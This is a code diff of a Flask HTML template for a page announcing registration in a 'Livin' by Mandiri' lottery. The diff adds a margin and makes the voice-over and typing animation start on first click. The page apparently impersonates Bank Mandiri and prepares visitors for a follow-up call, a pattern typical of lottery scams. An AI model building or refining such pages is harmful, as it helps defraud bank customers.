@@ -135,6 +135,7 @@
             }
             .ref-id {
                 margin-top: 20px;
+                margin-bottom: 20px;
                 text-align: center;
                 font-size: 16px;
                 color: #333;
@@ -154,7 +155,7 @@
             }
         </style>
     </head>
-    <body>
+    <body onclick="startAudioOnce()">
         <div class="image-container">
             <img src="{{ url_for('static', filename='a1.jpg') }}" class="bg" alt="Background">
             <div class="overlay-content">
@@ -174,6 +175,7 @@
                         const text = "Terima kasih telah mendaftar di layanan undian Livin' by Mandiri. Pendaftaran anda sedang diproses. Sesaat lagi anda akan dihubungi oleh pihak Bank Mandiri untuk proses cetak kode kupon undian anda.";
                         const speed = 55; // kecepatan ketikan
                         let i = 0;
+                        let started = false;
 
                         function typeText() {
                             if (i < text.length) {
@@ -183,24 +185,12 @@
                             }
                         }
 
-                        window.addEventListener('DOMContentLoaded', () => {
-                            const audio = document.getElementById('voice-over');
-                            const playPromise = audio.play();
-
-                            if (playPromise !== undefined) {
-                                playPromise
-                                .then(() => {
-                                    // Audio berhasil diputar, mulai ketikan
-                                    typeText();
-                                })
-                                .catch(error => {
-                                     console.log("Autoplay gagal:", error);
-                                     typeText(); // tetap jalankan teks
-                                });
-                            } else {
-                                typeText(); // jika play() tidak mengembalikan promise
-                            }
-                        });
+                        function startAudioOnce() {
+                            if (started) return;
+                            started = true;
+                            document.getElementById("voice-over").play();
+                            typeText();
+                        }
                     </script>
                 </div>
                 <div class="status-bar">
